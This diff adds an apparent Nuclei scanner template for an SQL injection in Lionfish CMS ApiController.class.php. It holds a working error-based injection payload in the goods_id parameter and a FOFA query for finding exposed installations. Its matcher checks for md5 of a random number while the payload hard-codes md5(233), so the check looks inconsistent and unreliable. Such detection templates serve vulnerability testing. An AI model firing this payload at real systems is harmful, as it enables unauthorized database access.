@@ -1,0 +1,33 @@
+id: shiziyu-apicontroller-sqlinjection
+info:
+  name: Lionfish CMS ApiController.class.php SQL Injection Vulnerability
+  author:
+  - zxcv
+  tags:
+  - sqlinjection
+  - shiziyu
+  description: |-
+    Lionfish CMS ApiController.class.php SQL Injection Vulnerability
+    The parameter filtering in Lionfish CMS ApiController.class.php is not rigorous, leading to a SQL injection vulnerability.
+  severity: high
+  metadata:
+    fofa-query: /seller.php?s=/Public/login
+    verified: true
+  remediation: "Upgrade to the latest version: http://www.shiziyu.net/gnzs/"
+requests:
+- matchers:
+  - type: word
+    part: body
+    words:
+    - 'XPATH syntax error: ''~'
+    - '{{verify}}'
+  - type: status
+    status:
+    - 404
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/index.php?s=api/goods_detail&goods_id=1 and updatexml(1,concat(0x7e,md5(233),0x7e),1)'
+  method: GET
+variables:
+  number: '{{rand_int(1, 100)}}'
+  verify: '{{md5({{number}})}}'
